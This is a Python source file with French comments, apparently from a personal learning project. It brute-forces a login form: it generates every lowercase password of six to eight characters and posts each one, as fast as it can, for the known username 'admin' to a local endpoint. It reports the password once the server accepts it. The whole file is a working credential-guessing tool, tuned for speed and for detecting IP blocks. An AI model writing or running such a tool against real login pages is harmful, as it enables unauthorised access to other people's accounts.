'''VERSION ASYNCHRONE : USERNAME FIXE ET VRAI MOTEUR DE RECHERCHE DE MOT DE PASSE (BRUTE-FORCE)
Pour les commentaires spécifiques a des variables "de base" voir /spam_V3/sync.py
'''
 
import httpx     
import asyncio
import sys # pour faire joli dans le terminal
import string
import itertools # Générer combinaisons

CHARGEMENT = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

# OPTIMISATION : On passe l'argument 'client' pour réutiliser la session TCP permanente
async def send_request(client: httpx.AsyncClient, username: str, password: str) -> int: # renvoie un entier
    url = "http://127.0.0:8000/login"
    donnees = {                                                                                  
        "username": username,                                                    
        "password": password                                                           
    }
    
    try:
        # Un timeout court (2.0s) évite au script de rester bloqué sur une requête perdue
        reponse = await client.post(url, data=donnees, timeout=2.0)
        return reponse.status_code
    except Exception:
        return 0 # Gère les micro-coupures réseau sans faire planter le script

# Fonction pour générer les mots de passe un par un
def search_password():
    # Choisir ses infos
    caracteres = string.ascii_lowercase # + string.digits + string.ascii_uppercase
    
    # Boucle for (les bases si tu connait pas ça chut):
    # Indices ---------: 0 1 2 3 
    # Numéros asscoiés : 1 2 3 4 
    # ATTENTION : la fin subit le comportement en n-1 (avec tableau des indices) ALORS que le premier est simplement le num demandé
    
    # Changer les indices pour taille min / max du mdp 
    # ex : for i in range (7,10) ->  de 7 caracteres a 9 
    for longueur in range(6, 9):
        # itertools.product génère toutes les combinaisons possibles pour une longueur donnée
        for combinaison in itertools.product(caracteres, repeat=longueur):
            # combinaison est un tuple ('a', 'b'), on le fusionne en texte "ab"
            yield "".join(combinaison)
            # yeeld : renvoie une valeur sans couper la focntion
                                                                         
async def main():
    print('🚀 Démarrage async.py...')
    
    # Initialisation des variables de suivi
    compteur_animation = 0
    tentatives = 0
    
    # LE USERNAME EST CONNU
    USERNAME_CONNU = "admin"
    
    # Initialisation de notre générateur de mots de passe
    moteur_de_recherche = search_password()
    
    # OPTIMISATION MAJEURE : On ouvre LE client unique AVANT la boucle
    # Toutes les requêtes vont partager ce tunnel, multipliant la vitesse par 5 ou 10
    async with httpx.AsyncClient() as client:
        while True:
            try:
                # Récupération du prochain mot de passe à tester
                # next() demande au générateur de nous donner la combinaison suivante
                try:
                    password_actuel = next(moteur_de_recherche)
                except StopIteration:
                    print("\n❌ Toutes les combinaisons possibles ont été testées.")
                    break

                # Gestion de l'animation graphique sur une seule ligne
                symbole = CHARGEMENT[compteur_animation % len(CHARGEMENT)]
                tentatives += 1
            
                # On affiche le mot de passe en cours de test dans l'animation
                sys.stdout.write(f"\r{symbole} Test : [{password_actuel}]... Tentative n°{tentatives}")
                sys.stdout.flush()
                compteur_animation += 1
                
                # Exécution de la requête réseau avec le client persistant
                statut = await send_request(client=client, username=USERNAME_CONNU, password=password_actuel)
                
                # OPTIMISATION VITESSE : On retire la grosse pause de 0.1s. 
                # On met un sleep quasi invisible pour laisser le processeur respirer sans brider la vitesse réseau.
                await asyncio.sleep(0.001) 
                
                # Analyse et traitement des statuts HTTP reçus
                if statut == 200:      
                    sys.stdout.write("\r" + " " * 60 + "\r")  # Efface l'animation courante                                                                    
                    print(f"✅ tentatives : {tentatives}")
                    print(f"👤 Login : {USERNAME_CONNU}")
                    print(f"🔑 MDP   : {password_actuel}")
                    break # Succès complet : on coupe la boucle
                  
                elif statut == 404: 
                    sys.stdout.write("\r" + " " * 60 + "\r")
                    print('❌ Erreur 404 : L\'adresse cible est introuvable.')                                                                         
                    break                 
                    
                elif statut == 401:                                                   
                    pass # Identifiants incorrects : l'animation continue au prochain mot de passe          
                    
                elif statut == 403:
                    sys.stdout.write("\r" + " " * 60 + "\r")
                    print('🔒 Erreur 403 : Accès interdit (IP bloquée ou pare-feu)')
                    break                                      
                    
                else:                                                                                        
                    sys.stdout.write("\r" + " " * 60 + "\r")
                    print(f"⚠️ Autre code reçu : {statut}")   
                    await asyncio.sleep(2)
                              
            except Exception as e:
                sys.stdout.write("\r" + " " * 60 + "\r")
                print(f"Erreur réseau détectée : {e}")
                await asyncio.sleep(10)

asyncio.run(main())
